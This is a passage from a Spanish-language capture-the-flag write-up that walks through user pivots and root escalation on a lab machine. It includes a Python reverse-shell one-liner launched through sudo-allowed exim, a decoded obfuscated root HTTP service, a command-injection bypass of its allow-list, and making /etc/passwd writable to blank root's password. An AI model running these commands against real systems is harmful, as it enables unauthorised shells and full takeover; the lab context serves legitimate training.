No nos va a dejar, por lo que podremos realizar varias combinaciones, entre ellas probar con `flipsy` ya que tiene mas sentido que el anterior.

## Escalate user flipsy

### SSH

```shell
flipsy@<IP>
```

Metemos como contraseña `Chocolate.1704` y veremos que estamos dentro.

## Escalate user darksblack

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for flipsy on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User flipsy may run the following commands on dockerlabs:
    (darksblack) NOPASSWD: /usr/sbin/exim
```

Vemos que podemos ejecutar `exim` como el usuario `darksblack`, por lo que haremos lo siguiente:

Si lo ejecutamos veremos lo siguiente:

```shell
sudo -u darksblack /usr/sbin/exim
```

Info:

```
Exim is a Mail Transfer Agent. It is normally called by Mail User Agents,
not directly from a shell command line. Options and/or arguments control
what it does when called. For a list of options, see the Exim documentation.
```

Podemos ejecutar un script con dicho binario siguiendo unos parametros, pero antes crearemos un archivo con una `reverse shell`.

```shell
cd /tmp
nano shell

#Dentro del nano
#!/bin/sh

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Lo guardamos y antes de ejecutar el script con `exim` nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si lo vamos a ejecutar en la maquina victima.

```shell
chmod +x /tmp/shell
sudo -u darksblack exim -be '${run{/tmp/shell1}}'
```

#### **¿Qué hace `exim -be`?**

* **`exim`**: Es un servidor de correo electrónico (MTA - Mail Transfer Agent) utilizado para enviar y recibir correos. Es un software muy común en servidores de correo.
* **`-be`**: Es una opción de Exim que ejecuta el programa en un "modo de prueba" (prueba de envío de correo). En este modo, Exim procesa y muestra cómo manejaría un mensaje de correo, pero **no envía el correo de verdad**. Es un modo que se usa para depurar o verificar configuraciones de correo.

***

#### **¿Qué hace `${run{/tmp/shell}}`?**

* **`${run{...}}`**: Esta es una característica especial de Exim que permite ejecutar comandos o scripts desde dentro de su configuración. Es como una "instrucción" para que Exim ejecute un comando externo.
* **`/tmp/shell`**: Es una ruta de archivo. En este caso, se está indicando a Exim que ejecute el archivo ubicado en `/tmp/shell`. Este archivo contiene la `reverse shell`.

**¿Qué pasa cuando Exim ejecuta `${run{/tmp/shell}}`?**

Cuando Exim recibe esta instrucción, **ejecuta el archivo que está en `/tmp/shell`**. Este archivo contendra la `reverse shell`. Si este archivo tiene el código adecuado, puede ejecutar una **shell** (como `sh`), lo que le permite al atacante obtener acceso al sistema, si este archivo ha sido modificado maliciosamente.

***

Si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 40112
$ whoami
whoami
darksblack
```

Por lo que vemos somo dicho usuario, tendremos que sanitizar la shell (`TTY`).

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si vemos que `id` tenemos, veremos lo siguiente:

```shell
id
```

Info:

```
uid=1000(darksblack) gid=1000(darksblack) groups=1000(darksblack),100(users),1002(cyber)
```

Vemos que estamos en el grupo `cyber` por lo que vamos a buscar por `grupos` con `find`.

```shell
find / -group cyber 2>/dev/null
```

Info:

```
/var/www/html/serverpi.py
```

Vemos que ese script `.py` esta dentro de dicho grupo y si lo leemos veremos lo siguiente:

```python
import base64; p0o = "aW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgYmFzZTY0CgpQT1JUID0gMjUwMDAKCkFVVEhfS0VZX0JBU0U2NCA9ICJNREF3TUdONVltVnljMlZqWDJkeWIzVndYM0owWHpBd01EQXdNQW89IgoKY2xhc3MgSGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBhdXRoX2hlYWRlciA9IHNlbGYuaGVhZGVycy5nZXQoJ0F1dGhvcml6YXRpb24nKQoKICAgICAgICBpZiBhdXRoX2hlYWRlciBpcyBOb25lIG9yIG5vdCBhdXRoX2hlYWRlci5zdGFydHN3aXRoKCdCYXNpYycpOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAxKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiQXV0aG9yaXphdGlvbiBoZWFkZXIgaXMgbWlzc2luZyBvciBpbmNvcnJlY3QiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBFeHRyYWVyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUgKGVuIEJhc2U2NCkKICAgICAgICBlbmNvZGVkX2tleSA9IGF1dGhfaGVhZGVyLnNwbGl0KCdCYXNpYyAnKVsxXQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGFsbWFjZW5hZGEgZW4gQmFzZTY0CiAgICAgICAgZGVjb2RlZF9zdG9yZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShBVVRIX0tFWV9CQVNFNjQpLmRlY29kZSgpLnN0cmlwKCkgICMgRWxpbWluYXIgc2FsdG9zIGRlIGzDrW5lYQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUKICAgICAgICBkZWNvZGVkX2NsaWVudF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5KS5kZWNvZGUoKS5zdHJpcCgpICAjIEVsaW1pbmFyIHNhbHRvcyBkZSBsw61uZWEKCiAgICAgICAgIyBDb21wYXJhciBsYXMgY2xhdmVzCiAgICAgICAgaWYgZGVjb2RlZF9jbGllbnRfa2V5ICE9IGRlY29kZWRfc3RvcmVkX2tleToKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMykKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIkludmFsaWQgYXV0aG9yaXphdGlvbiBrZXkiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBQcm9jZXNhciBlbCBwYXLDoW1ldHJvICdleGVjJwogICAgICAgIHBhcnNlZF9wYXRoID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKHNlbGYucGF0aCkKICAgICAgICBxdWVyeV9wYXJhbXMgPSB1cmxsaWIucGFyc2UucGFyc2VfcXMocGFyc2VkX3BhdGgucXVlcnkpCgogICAgICAgIGlmICdleGVjJyBpbiBxdWVyeV9wYXJhbXM6CiAgICAgICAgICAgIGNvbW1hbmQgPSBxdWVyeV9wYXJhbXNbJ2V4ZWMnXVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhbGxvd2VkX2NvbW1hbmRzID0gWydscycsICd3aG9hbWknXQogICAgICAgICAgICAgICAgaWYgbm90IGFueShjb21tYW5kLnN0YXJ0c3dpdGgoY21kKSBmb3IgY21kIGluIGFsbG93ZWRfY29tbWFuZHMpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSg0MDMpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJDb21tYW5kIG5vdCBhbGxvd2VkLiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoY29tbWFuZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShyZXN1bHQpCiAgICAgICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDUwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShlLm91dHB1dCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAwKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiTWlzc2luZyAnZXhlYycgcGFyYW1ldGVyIGluIFVSTCIpCgp3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIxMjcuMC4wLjEiLCBQT1JUKSwgSGFuZGxlcikgYXMgaHR0cGQ6CiAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkK"; p1tr = base64.b64decode(p0o.encode()).decode(); exec(p1tr)
```

Si lo decodificamos veremos lo siguiente:

```python
import http.server
import socketserver
import urllib.parse
import subprocess
import base64

PORT = 25000

AUTH_KEY_BASE64 = "MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        auth_header = self.headers.get('Authorization')

        if auth_header is None or not auth_header.startswith('Basic'):
            self.send_response(401)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Authorization header is missing or incorrect")
            return

        # Extraer la clave enviada por el cliente (en Base64)
        encoded_key = auth_header.split('Basic ')[1]

        # Decodificar la clave almacenada en Base64
        decoded_stored_key = base64.b64decode(AUTH_KEY_BASE64).decode().strip()  # Eliminar saltos de línea

        # Decodificar la clave enviada por el cliente
        decoded_client_key = base64.b64decode(encoded_key).decode().strip()  # Eliminar saltos de línea

        # Comparar las claves
        if decoded_client_key != decoded_stored_key:
            self.send_response(403)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid authorization key")
            return

        # Procesar el parámetro 'exec'
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if 'exec' in query_params:
            command = query_params['exec'][0]
            try:
                allowed_commands = ['ls', 'whoami']
                if not any(command.startswith(cmd) for cmd in allowed_commands):
                    self.send_response(403)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"Command not allowed.")
                    return

                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(result)
            except subprocess.CalledProcessError as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(e.output)
        else:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Missing 'exec' parameter in URL")

with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
    httpd.serve_forever()
```

Vemos que dentro de la maquina a nivel local en el puerto `25000` esta corriendo esta aplicacion en la que se puede ejecutar `2` comando `ls` y `whoami`, vamos a probar a ejecutar por ejemplo `whoami`:

```shell
curl -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo=" "http://127.0.0.1:25000?exec=whoami"
```

Info:

```
root
```

Vemos que se esta ejecutando como `root`, por lo que haremos lo siguiente.

Vamos a probar si se pueden concatenar comandos con `;` de la siguiente forma:

```shell
curl -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo=" "http://127.0.0.1:25000?exec=whoami%3B%20ls%20-la%20/root"
```

Tendremos que `URLEncodearlo` para que funcione:

```
whoami; ls -la /root = whoami%3B%20ls%20-la%20/root
```

Info:

```
root
total 24
drwx------ 1 root root 4096 Feb 23 17:36 .
drwxr-xr-x 1 root root 4096 Mar  3 07:25 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
lrwxrwxrwx 1 root root    9 Feb 23 17:06 .clush_history -> /dev/null
drwxr-xr-x 3 root root 4096 Feb 19 15:56 .local
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Feb 20 08:18 .ssh
```

Vamos realizar lo siguiente para poder ser `root`.

```shell
curl -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo=" "http://127.0.0.1:25000?exec=whoami;chmod%20777%20/etc/passwd"
```

Con esto vamos a poner el archivo `passwd` con todos los permisos posibles, para poder quitar la contraseña a `root`, una vez ejecutado haremos lo siguiente:

```shell
ls -la /etc/passwd
```

Info:

```
-rwxrwxrwx 1 root root 1239 Feb 22 07:04 /etc/passwd
```

Ahora que sabemos que funciono, haremos esto:

```shell
nano /etc/passwd

#Dentro del nano
#La linea del usuario root, le quitaremos la "x" quedando de esta forma:
root::0:0:root:/root:/bin/sh
```

Lo guardamos y hacemos lo siguiente:

```shell
su root
```

Info:

```
# whoami
root
```

Con esto ya seremos `root` directamente, por lo que habremos terminado la maquina.
